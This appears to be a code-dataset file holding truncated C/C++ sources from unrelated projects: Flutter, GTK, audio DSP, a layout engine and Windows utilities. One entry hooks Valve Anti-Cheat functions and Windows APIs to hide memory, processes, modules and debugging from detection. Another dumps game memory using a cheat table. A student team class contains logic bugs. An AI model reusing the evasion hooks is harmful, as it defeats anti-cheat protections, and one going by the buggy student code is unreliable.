\"Write Async ended up writing \" << bytes_written << \" bytes\" << std::endl;\n    if (bytes_written < 0) {\n      throw std::runtime_error(CUFILE_ERRSTR(abs(bytes_written)+CUFILEOP_BASE_ERR));\n    }\n  } catch (kvikio::CUfileException &e) {\n    std::cout << \"Error: \" << e.what() << std::endl;\n    exit(-1);\n  }\n\n  return 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"Hooks.h\"\r\n\r\nint _cdecl hkTfn1(HANDLE ProcessHandle, int a2){\r\n\tif (ProcessHandle == GetCurrentProcess())\r\n\t\treturn pFn1(ProcessHandle, a2);\r\n\treturn false;\r\n}\r\n\r\nDWORD _stdcall hkTfn2(HANDLE TargetHandle, int a2, int a3){\r\n\tif (TargetHandle == GetCurrentProcess())\r\n\t\treturn pFn2(TargetHandle, a2, a3);\r\n\treturn false;\r\n}\r\n\r\nbool _cdecl hkTfn3(DWORD dwProcessId, int a2, int a3){\r\n\tif (dwProcessId == GetCurrentProcessId())\r\n\t\treturn pFn3(dwProcessId, a2, a3);\r\n\treturn false;\r\n}\r\n\r\nchar _stdcall hkTfn4(){\r\n\treturn true;\r\n}\r\n\r\nchar _stdcall hkTfn5(char* p_this){\r\n\treturn true;\r\n}\r\n\r\nDWORD* _stdcall hkTfn6(DWORD* p_this){\r\n\treturn p_this;\r\n}\r\n\r\nchar _stdcall hkTfn7(BYTE* p_this, int a2, HANDLE TargetHandle, int a4, int a5, int a6){\r\n\tif (TargetHandle == GetCurrentProcess())\r\n\t\treturn pFn7(p_this, a2, TargetHandle, a4, a5, a6);\r\n\treturn true;\r\n}\r\n\r\nSIZE_T __stdcall hkVirtualQuery(LPCVOID lpAdress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {\r\n\tlpBuffer->AllocationProtect = PAGE_NOACCESS;\r\n\tlpBuffer->Protect = PAGE_NOACCESS;\r\n\tlpBuffer->Type = MEM_MAPPED;\r\n\treturn sizeof(MEMORY_BASIC_INFORMATION);\r\n}\r\n\r\nSIZE_T __stdcall hkVirtualQueryEx(HANDLE hProcess, LPCVOID lpAdress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {\r\n\tlpBuffer->AllocationProtect = PAGE_NOACCESS;\r\n\tlpBuffer->Protect = PAGE_NOACCESS;\r\n\tlpBuffer->Type = MEM_MAPPED;\r\n\treturn sizeof(MEMORY_BASIC_INFORMATION);\r\n}\r\n\r\nBOOL __stdcall hkProcess32NextW(HANDLE hSnapShot, LPPROCESSENTRY32W lppe) {\r\n\treturn 0;\r\n}\r\n\r\nBOOL __stdcall hkModule32NextW(HANDLE hSnapShot, LPMODULEENTRY32W lppe) {\r\n\treturn 0;\r\n}\r\n\r\nBOOL __stdcall hkIsDebuggerPresent(){\r\n\treturn false;\r\n}\r\n\r\nNTSTATUS hkNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesRead){\r\n\treturn STATUS_ACCESS_VIOLATION;\r\n}\r\n\r\nbool InitVACHooks(void* DllImageBase) {\r\n\tpFn1 = (tFn1)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 83 EC ? 8D 45 F8 C7 45 F8 ? ? ? ?\"), (PBYTE)hkTfn1);\r\n\tpFn2 = (tFn2)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 81 EC ? ? ? ? 53 56 57 6A ? 68 ? ? ? ?\"), (PBYTE)hkTfn2);\r\n\tpFn3 = (tFn3)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 51 56 57 8B 7D 0C\"), (PBYTE)hkTfn3);\r\n\tpFn4 = (tFn4)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 81 EC ? ? ? ? 56 8B 35 ? ? ? ?\"), (PBYTE)hkTfn4);\r\n\tpFn5 = (tFn5)DetourFunction((PBYTE)PatternScan(DllImageBase, \"56 57 8B F9 C7 07 ? ? ? ? C7 47 04 ? ? ? ?\"), (PBYTE)hkTfn5);\r\n\tpFn6 = (tFn6)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 83 EC ? 56 8B F1 C7 06 ? ? ? ?\"), (PBYTE)hkTfn6);\r\n\tpFn7 = (tFn7)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 81 EC ? ? ? ? 53 8B D9 32 C0\"), (PBYTE)hkTfn7);\r\n\r\n\tHMODULE kernelModule = GetModuleHandleA(\"kernel32.dll\");\r\n\tif (!kernelModule)\r\n\t\treturn false;\r\n\r\n\tpVirtualQuery = (tVirtualQuery)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"VirtualQuery\"), (PBYTE)hkVirtualQuery);\r\n\tpVirtualQueryEx = (tVirtualQueryEx)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"VirtualQueryEx\"), (PBYTE)hkVirtualQueryEx);\r\n\tpProcess32NextW = (tProcess32NextW)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"Process32NextW\"), (PBYTE)hkProcess32NextW);\r\n\tpModule32NextW = (tModule32NextW)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"Module32NextW\"), (PBYTE)hkModule32NextW);\r\n\tpIsDebuggerPresent = (tIsDebuggerPresent)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"IsDebuggerPresent\"), (PBYTE)hkIsDebuggerPresent);\r\n\tpNtReadVirtualMemory = (tNtReadVirtualMemory)DetourFunction((PBYTE)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtReadVirtualMemory\"), (PBYTE)hkNtReadVirtualMemory);\r\n\r\n\r\n\treturn true;\r\n}\r\n",
    "#include <iostream>\n#include \"CssManager.h\"\n\nCssManager::CssManager() {\n    provider = gtk_css_provider_new();\n    provider2 = gtk_css_provider_new();\n    context = gtk_style_context_new();\n}\nCssManager::~CssManager() {\n    g_object_unref(provider);\n    g_object_unref(provider2);\n    g_object_unref(context);\n}\n\n// Load styles from a file\nvoid CssManager::loadFromFile(const gchar *filename) {\n    gtk_css_provider_load_from_file(provider, g_file_new_for_path(filename), nullptr);\n    gtk_style_context_add_provider_for_screen(gdk_screen_get_default(),\n                                              GTK_STYLE_PROVIDER(provider),\n                                              GTK_STYLE_PROVIDER_PRIORITY_USER);\n}\n// Load styles from a string\nvoid CssManager::loadFromData(const gchar *data) {\n    gtk_css_provider_load_from_data(provider2, data, -1, nullptr);\n    gtk_style_context_add_provider_for_screen(gdk_screen_get_default(),\n                                              GTK_STYLE_PROVIDER(provider2),\n                                              GTK_STYLE_PROVIDER_PRIORITY_USER);\n}\nvoid CssManager::loadFromHex(unsigned char* hex, unsigned int hex_len) {\n    std::string decoded_text;\n\n    for (unsigned int i = 0; i < hex_len; ++i) {\n        decoded_text += hex[i];\n    }\n\n    CssManager::loadFromData(decoded_text.c_str());\n}",
    "#include \"um.h\"\r\n#include \"json.h\"\r\n#include <fstream>\r\n\r\nusing nlohmann::json;\r\n\r\nint main( ) {\r\n    // Setup\r\n    cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_meth_setup();\r\n\r\n    // Get module\r\n    auto game_assembly = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_get_module(L\"GameAssembly.dll\");\r\n\r\n    // Read JSON input\r\n    std::ifstream input(\"json.txt\");\r\n    nlohmann::json crazy_swag;\r\n    input >> crazy_swag;\r\n    input.close();\r\n\r\n    // Open output file\r\n    std::ofstream output(\"material_output.txt\");\r\n\r\n    // Process each entry in the JSON\r\n    auto crazy_sneed = crazy_swag[\"CheatTable\"][\"CheatEntries\"][\"CheatEntry\"];\r\n    for (auto& entry : crazy_sneed) {\r\n        // Extract address\r\n        std::string addr_s = entry[\"Address\"];\r\n        unsigned long long crazy_value;\r\n        std::istringstream iss(addr_s);\r\n        iss >> std::hex >> crazy_value;\r\n        crazy_value -= 0x88;\r\n\r\n        // Read name\r\n        char material_name[255];\r\n        auto material_addy = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read<uintptr_t>(crazy_value + 0x30);\r\n        cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read(material_addy, material_name, 255);\r\n        material_name[254] = 0;\r\n        std::string name(material_name);\r\n\r\n        // Read key\r\n        auto material_address = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read<uint32_t>(crazy_value + 0x8);\r\n\r\n        // Write to output file\r\n        output << \"material name: \" << name << \", material address: \" << material_address << \"\\n\";\r\n    }\r\n\r\n    // Close output file\r\n    output.close();\r\n\r\n    return 0;\r\n}",
    "#include <iostream>\n#include <string>\n#include <fstream>\n\nusing namespace std;\nclass Player {\nprivate:\n    string name;\n    int yearOfBirth;\n    int height;\n    int internationalGoals;\n    string nationality;\npublic:\n\n    //setters\n    void setName(string name){this->name = name;}\n    void setYearOfBirth(int yearOfBirth){this->yearOfBirth = yearOfBirth;}\n    void setHeight(int height){this->height = height;}\n    void setInternationalGoals(int internationalGoals){this->internationalGoals = internationalGoals;}\n    void setNationality(string nationality){this->nationality = nationality;}\n\n    //getters\n    string getName() const { return this->name;}\n    int getYearOfBirth() const  { return this->yearOfBirth;}\n    int getInternationalGoals() const {return this->internationalGoals;}\n    int getHeight(){return this->height;}\n\n    string getNationality() const {return this->nationality;}\n};\n\nclass NationalTeam {\nprivate:\n    string country;\n    Player players[18];\n    bool active[18];\n    int size;\npublic:\n    NationalTeam(string country = \" \") {\n        this->country = country;\n        size = 0;\n        for (int i = 0; i < 18; i++) active[i]=false;\n    }\n\n    bool addPlayer(const Player& player) {\n        if(this->size >= 18) return false;\n\n        this->players[this->size++] = player;\n        this->active[this->size++] = true;\n        return true;\n    }\n\n    bool removePlayer(string playerName) {\n        for (int i = 0; i < this->size; i++) {\n            if (players[i].getName() == playerName) {active[i] = false;return true;}\n            return false;\n        }\n    }\n\n    // to return total number of Players in the team\n    int getNumOfallPlayers() const {return this->size;}\n\n    // to return the average height of the team Players\n    int avgHeight() const {\n        int sum = 0;\n        for (int i = 0; i < this->size; i++) {sum+=players[i].getYearOfBirth();}\n        return sum/this->size;\n    }\n\n    // to return the oldest player object\n    Player oldestPlayer() const {\n        int oldestPlayer = players[0].getYearOfBirth();\n        int i;\n        for (i = 1; i < this->size; i++) {\n            if (players[i].getYearOfBirth() > oldestPlayer){oldestPlayer = players[i].getYearOfBirth();}\n        }return players[i];\n    }\n\n   // to return the youngest player object\n   Player youngestPlayer() const {\n        int youngestPlayer = players[0].getYearOfBirth();\n        int i;\n        for (i = 1; i < this->size; i++) {\n            if (players[i].getYearOfBirth() < youngestPlayer){youngestPlayer = players[i].getYearOfBirth();}\n        }return players[i];\n    }\n\n   // to return the average number of international goals per player in the team\n   int avgIntGoals() const {\n        int sum = 0;\n        for (int i = 0; i < this->size; i++) {sum+=players[i].getInternationalGoals();}\n        return sum/this->size;\n    }\n\n   // to return the player with the highest number of international goals\n   Player highestIntGoals() const {\n        int highestIntGoals = players[0].getInternationalGoals();\n        int i = 1;\n        for (i = 1; i < this->size; i++) {\n            if (players[i].getInternationalGoals() > highestIntGoals){highestIntGoals = players[i].getInternationalGoals();}\n        }return players[i];\n    }\n\n    string getCountry() const{return this->country;}\n\n    // to output a team\u2019s country and its allPlayers info.\n    friend ostream &operator<<( ostream &output, NationalTeam &team) {\n        output << \"team\u2019s country : \" << team.getCountry();\n        for (int i = 0 ; i < team.getNumOfallPlayers(); i++) {\n            output << \"player #\" << i+1 << \": \" << endl;\n            output << \"name: \" << team.players[i].getName() << endl;\n            output << \"get year of birth: \" << team.players[i].getYearOfBirth() << endl;\n            output << \"height: \" << team.players[i].getHeight() << endl;\n            output << \"international goals: \" << team.players[i].getInternationalGoals() << endl;\n            output << \"nationality: \" << team.players[i].getNationality() << endl;\n        }\n        return output;\n    }\n};\n\n\nPlayer* readallPlayersFromFile(ifstream& allPlayersInfo, Player *allPlayers, int size) {\n    string strInfo; int intInfo, index = 0; Player player;\n\n    allPlayers = new Player[size];\n\n    while (getline(allPlayersInfo, strInfo)) {\n        if(index >= size){break;}\n        player.setName(strInfo);\n\n        getline(allPlayersInfo, strInfo);\n        intInfo = stoi(strInfo);\n        player.setYearOfBirth(intInfo);\n\n        getline(allPlayersInfo, strInfo);\n        intInfo = stoi(strInfo);\n        player.setHeight(intInfo);\n\n        getline(allPlayersInfo, strInfo);\n        intInfo = stoi(strInfo);\n        player.setInternationalGoals(intInfo);\n\n        getline(allPlayersInfo, strInfo);\n        player.setNationality(strInfo);\n\n        // to ignor sprated space in the file\n        getline(allPlayersInfo, strInfo);\n\n        allPlayers[index++] = player;\n    }\n    allPlayersInfo.close();\n    return allPlayers;\n}\n\nvoid writeS",
    "#include \"daisysp.h\"\n#include \"daisy_seed.h\"\n\n// Interleaved audio definitions\n#define LEFT (i)\n#define RIGHT (i + 1)\n\n// Number of delay lines\n#define LPCF_NUM 8U\n#define APF_NUM 4U\n\nusing namespace daisysp;\nusing namespace daisy;\n\nstatic DaisySeed hw;\n\n// Declare LPF DelayLines\nstatic DelayLine<float, 1U> lpf_del[LPCF_NUM];\n\n// Declare FBCF DelayLines\nstatic DelayLine<float, 4999U + 1U> comb_del[LPCF_NUM];\n\n// Declare APF DelayLines\nstatic DelayLine<float, 557U + 1U> apf_del[APF_NUM];\n\n// Number of primes\n#define PRIMES_NUM 669\n\nconst unsigned short primes[PRIMES_NUM] = {\n2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,211,223,227,229,233,239,241,251,257,263,269,271,277,281,283,293,307,311,313,317,331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,421,431,433,439,443,449,457,461,463,467,479,487,491,499,503,509,521,523,541,547,557,563,569,571,577,587,593,599,601,607,613,617,619,631,641,643,647,653,659,661,673,677,683,691,701,709,719,727,733,739,743,751,757,761,769,773,787,797,809,811,821,823,827,829,839,853,857,859,863,877,881,883,887,907,911,919,929,937,941,947,953,967,971,977,983,991,\n997,1009,1013,1019,1021,1031,1033,1039,1049,1051,1061,1063,1069,1087,1091,1093,1097,1103,1109,1117,1123,1129,1151,1153,1163,1171,1181,1187,1193,1201,1213,1217,1223,1229,1231,1237,1249,1259,1277,1279,1283,1289,1291,1297,1301,1303,1307,1319,1321,1327,1361,1367,1373,1381,1399,1409,1423,1427,1429,1433,1439,1447,1451,1453,1459,1471,1481,1483,1487,1489,1493,1499,1511,1523,1531,1543,1549,1553,1559,1567,1571,1579,1583,1597,1601,1607,1609,1613,1619,1621,1627,1637,1657,1663,1667,1669,1693,1697,1699,1709,1721,1723,1733,1741,1747,1753,1759,1777,1783,1787,1789,1801,1811,1823,1831,1847,1861,1867,1871,1873,1877,1879,1889,1901,1907,1913,1931,1933,\n1949,1951,1973,1979,1987,1993,1997,1999,2003,2011,2017,2027,2029,2039,2053,2063,2069,2081,2083,2087,2089,2099,2111,2113,2129,2131,2137,2141,2143,2153,2161,2179,2203,2207,2213,2221,2237,2239,2243,2251,2267,2269,2273,2281,2287,2293,2297,2309,2311,2333,2339,2341,2347,2351,2357,2371,2377,2381,2383,2389,2393,2399,2411,2417,2423,2437,2441,2447,2459,2467,2473,2477,2503,2521,2531,2539,2543,2549,2551,2557,2579,2591,2593,2609,2617,2621,2633,2647,2657,2659,2663,2671,2677,2683,2687,2689,2693,2699,2707,2711,2713,2719,2729,2731,2741,2749,2753,2767,2777,2789,2791,2797,2801,2803,2819,2833,2837,2843,2851,2857,2861,2879,2887,2897,2903,2909,2917,2927,\n2939,2953,2957,2963,2969,2971,2999,3001,3011,3019,3023,3037,3041,3049,3061,3067,3079,3083,3089,3109,3119,3121,3137,3163,3167,3169,3181,3187,3191,3203,3209,3217,3221,3229,3251,3253,3257,3259,3271,3299,3301,3307,3313,3319,3323,3329,3331,3343,3347,3359,3361,3371,3373,3389,3391,3407,3413,3433,3449,3457,3461,3463,3467,3469,3491,3499,3511,3517,3527,3529,3533,3539,3541,3547,3557,3559,3571,3581,3583,3593,3607,3613,3617,3623,3631,3637,3643,3659,3671,3673,3677,3691,3697,3701,3709,3719,3727,3733,3739,3761,3767,3769,3779,3793,3797,3803,3821,3823,3833,3847,3851,3853,3863,3877,3881,3889,3907,3911,3917,3919,3923,3929,3931,3943,3947,3967,3989,4001,\n4003,4007,4013,4019,4021,4027,4049,4051,4057,4073,4079,4091,4093,4099,4111,4127,4129,4133,4139,4153,4157,4159,4177,4201,4211,4217,4219,4229,4231,4241,4243,4253,4259,4261,4271,4273,4283,4289,4297,4327,4337,4339,4349,4357,4363,4373,4391,4397,4409,4421,4423,4441,4447,4451,4457,4463,4481,4483,4493,4507,4513,4517,4519,4523,4547,4549,4561,4567,4583,4591,4597,4603,4621,4637,4639,4643,4649,4651,4657,4663,4673,4679,4691,4703,4721,4723,4729,4733,4751,4759,4783,4787,4789,4793,4799,4801,4813,4817,4831,4861,4871,4877,4889,4903,4909,4919,4931,4933,4937,4943,4951,4957,4967,4969,4973,4987,4993,4999\n};\n\nunsigned int selectedPrimes[LPCF_NUM];\n\n//float comb_g = 0.84f;\n\nfloat x, sig_out;\nfloat lpf_y;\nfloat comb_del_out, comb_y, parallel_combs;\nfloat apf_del_out, apf_feedback, apf_y;\nunsigned char idx;\n\n// Potentiometer controls\nfloat wetCV;\nfloat lengthCV;\nfloat densityCV;\nfloat feedbackGainCV;\n\n\nstatic void AudioCallback(AudioHandle::InterleavingInputBuffer  in,\n                          AudioHandle::InterleavingOutputBuffer out,\n                          size_t                                size)\n{\n\n    for(size_t i = 0; i < size; i += 2)\n    {\n\n        x = 0.5f * (in[LEFT] + in[RIGHT]); // mono input\n\n        // Parallel LPCFs\n        parallel_combs = 0;\n        for(idx = 0; idx < LPCF_NUM; idx++) {\n\n            comb_del_out = comb_del[idx].Read();\n            parallel_combs += comb_del_out / LPCF_NUM; // Take output here\n\n\t\t\t// LPF\n            lpf_y = (0.8f * comb_del_out) + (0.2f * lpf_del[idx].Read());\n            lpf_del[idx].Write(lpf_y);\n\n\t\t\t// Comb\n            comb_y = x + (feedbackGainCV * lpf_y);\n            comb_del[idx].Write(comb_y);\n        }\n\n\t\t// Series APFs\n\t\tapf_y = parallel_combs;\n\t\tfor(idx = 0; idx < APF_NUM; idx++) {\n            // APF\n\t\t\tapf_del_out = apf_del[idx].Read();\n\t\t\tapf_feedback = apf_y - (0.7 * apf_del_out);\n\t\t",
    "#include \"tablebox.h\"\n#include \"borderpainter.h\"\n#include \"pagebuilder.h\"\n\n#include <span>\n#include <ranges>\n\nnamespace plutobook {\n\nTableBox::TableBox(Node* node, const RefPtr<BoxStyle>& style)\n    : BlockBox(node, style)\n    , m_columns(style->heap())\n    , m_captions(style->heap())\n    , m_sections(style->heap())\n    , m_borderHorizontalSpacing(0.f)\n    , m_borderVerticalSpacing(0.f)\n{\n    if(style->borderCollapse() == BorderCollapse::Separate) {\n        m_borderHorizontalSpacing = style->borderHorizontalSpacing();\n        m_borderVerticalSpacing = style->borderVerticalSpacing();\n    }\n}\n\nvoid TableBox::addChild(Box* newChild)\n{\n    if(newChild->isTableCaptionBox() || newChild->isTableColumnBox()\n        || newChild->isTableSectionBox()) {\n        appendChild(newChild);\n        return;\n    }\n\n    auto lastSection = lastChild();\n    if(lastSection && lastSection->isAnonymous() && lastSection->isTableSectionBox()) {\n        lastSection->addChild(newChild);\n        return;\n    }\n\n    auto newSection = createAnonymous(Display::TableRowGroup, style());\n    appendChild(newSection);\n    newSection->addChild(newChild);\n}\n\nvoid TableBox::updateOverflowRect()\n{\n    BlockBox::updateOverflowRect();\n    for(auto caption : m_captions)\n        addOverflowRect(caption, caption->x(), caption->y());\n    for(auto section : m_sections) {\n        for(auto row : section->rows()) {\n            for(auto& [col, cell] : row->cells()) {\n                auto cellBox = cell.box();\n                if(cell.inColOrRowSpan())\n                    continue;\n                Point offset(section->location() + cellBox->location());\n                addOverflowRect(cellBox, offset.x, offset.y);\n                if(style()->borderCollapse() == BorderCollapse::Separate)\n                    continue;\n                auto& edges = cellBox->collapsedBorderEdges();\n                auto topHalfWidth = edges.topEdge().width() / 2.f;\n                auto bottomHalfWidth = edges.bottomEdge().width() / 2.f;\n                auto leftHalfWidth = edges.leftEdge().width() / 2.f;\n                auto rightHalfWidth = edges.rightEdge().width() / 2.f;\n\n                Rect borderRect(offset, cellBox->size());\n                borderRect.expand(topHalfWidth, bottomHalfWidth, leftHalfWidth, rightHalfWidth);\n                addOverflowRect(borderRect.y, borderRect.bottom(), borderRect.x, borderRect.right());\n            }\n        }\n    }\n}\n\nvoid TableBox::computePreferredWidths(float& minWidth, float& maxWidth) const\n{\n    if(!m_columns.empty()) {\n        m_tableLayout->computePreferredWidths(minWidth, maxWidth);\n        minWidth += borderHorizontalSpacing() * (m_columns.size() + 1);\n        maxWidth += borderHorizontalSpacing() * (m_columns.size() + 1);\n    }\n\n    for(auto caption : m_captions) {\n        minWidth = std::max(minWidth, caption->minPreferredWidth());\n        maxWidth = std::max(maxWidth, caption->minPreferredWidth());\n    }\n}\n\nvoid TableBox::updatePreferredWidths() const\n{\n    m_minPreferredWidth = 0;\n    m_maxPreferredWidth = 0;\n    computePreferredWidths(m_minPreferredWidth, m_maxPreferredWidth);\n\n    auto widthLength = style()->width();\n    auto minWidthLength = style()->minWidth();\n    auto maxWidthLength = style()->maxWidth();\n    if(widthLength.isFixed() && widthLength.value() > 0) {\n        m_maxPreferredWidth = std::max(m_minPreferredWidth, adjustContentBoxWidth(widthLength.value()));\n        if(maxWidthLength.isFixed()) {\n            m_maxPreferredWidth = std::min(m_maxPreferredWidth, adjustContentBoxWidth(maxWidthLength.value()));\n            m_maxPreferredWidth = std::max(m_minPreferredWidth, m_maxPreferredWidth);\n        }\n\n        m_minPreferredWidth = m_maxPreferredWidth;\n    }\n\n    if(minWidthLength.isFixed() && minWidthLength.value() > 0) {\n        m_minPreferredWidth = std::max(m_minPreferredWidth, adjustContentBoxWidth(minWidthLength.value()));\n        m_maxPreferredWidth = std::max(m_maxPreferredWidth, adjustContentBoxWidth(minWidthLength.value()));\n    }\n\n    if(maxWidthLength.isFixed()) {\n        m_maxPreferredWidth = std::min(m_maxPreferredWidth, adjustContentBoxWidth(maxWidthLength.value()));\n        m_maxPreferredWidth = std::max(m_minPreferredWidth, m_maxPreferredWidth);\n    }\n\n    m_minPreferredWidth += borderAndPaddingWidth();\n    m_maxPreferredWidth += borderAndPaddingWidth();\n}\n\nvoid TableBox::updateBorderWidths() const\n{\n    if(style()->borderCollapse() == BorderCollapse::Separate) {\n        BlockBox::updateBorderWidths();\n        return;\n    }\n\n    m_borderTop = 0.f;\n    m_borderBottom = 0.f;\n    m_borderLeft = 0.f;\n    m_borderRight = 0.f;\n    if(auto section = topSection()) {\n        auto row = section->firstRow();\n        for(auto& [col, cell] : row->cells()) {\n            m_borderTop = std::max(m_borderTop, cell->borderTop());\n        }\n    }\n\n    if(auto section = bottomSection()) {\n        auto row = section->lastRow();\n        for(auto& [col, cell] : row->cells()) {\n            m_borderBottom = std::max(m_borderBo",
    "#include \"util.h\"\n\n#include <commdlg.h>\n#include <random>\n\nstd::optional<std::string> util::SelectFile(const char* filter, const char* title)\n{\n\tauto currPath = std::filesystem::current_path();\n\n\tOPENFILENAME ofn;\n\tchar szFile[260] = { 0 };\n\tZeroMemory(&ofn, sizeof(ofn));\n\tofn.lStructSize = sizeof(ofn);\n\tofn.hwndOwner = NULL;\n\tofn.lpstrFile = szFile;\n\tofn.nMaxFile = sizeof(szFile);\n\tofn.lpstrFilter = filter;\n\tofn.lpstrTitle = title;\n\tofn.nFilterIndex = 1;\n\tofn.lpstrFileTitle = NULL;\n\tofn.nMaxFileTitle = 0;\n\tofn.lpstrInitialDir = NULL;\n\tofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;\n\n\tstd::optional<std::string> result = {};\n\tif (GetOpenFileName(&ofn) == TRUE)\n\t\tresult = std::string(szFile);\n\n\tcurrent_path(currPath);\n\treturn result;\n}\n\nstd::string util::GetLastErrorAsString(DWORD errorId)\n{\n\tauto errorMessageID = errorId == 0 ? GetLastError() : errorId;\n\tif (errorMessageID == 0)\n\t\treturn std::string();\n\t\n\tLPSTR messageBuffer = nullptr;\n\tauto size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,\n\t\tNULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);\n\t\n\tstd::string message(messageBuffer, size);\n\tLocalFree(messageBuffer);\n\treturn message;\n}\n\nstd::string util::ShuffleDllName(const std::string& path)\n{\n\tsize_t lastSlash = path.find_last_of(\"\\\\\");\n\tsize_t lastDot = path.find_last_of(\".\");\n\n\tif (lastSlash == 